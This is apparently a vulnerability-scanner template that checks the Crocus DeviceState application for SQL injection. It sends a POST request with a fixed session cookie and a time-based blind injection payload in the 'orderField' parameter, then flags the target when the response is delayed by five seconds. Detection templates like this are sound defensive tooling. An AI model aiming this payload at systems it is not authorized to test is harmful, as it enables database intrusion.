id: Crocus-DeviceState-sqlInjection

info:
  name: Crocus DeviceState SQL Injection
  author: iSee857
  severity: high
  description: |
    This template detects a SQL Injection vulnerability in the Crocus DeviceState application by exploiting the 'orderField' parameter.

http:
  - method: POST
    raw:
      - |
        POST /DeviceState.do?Action=Query HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="

        EndTime=2025-12-20+00%3A00%3A00&PageIndex=0&PageSize=1&RepairState=-1&StartTime=2025-08-26+00%3A00%3A00&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)&orderType=asc

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Code\":200"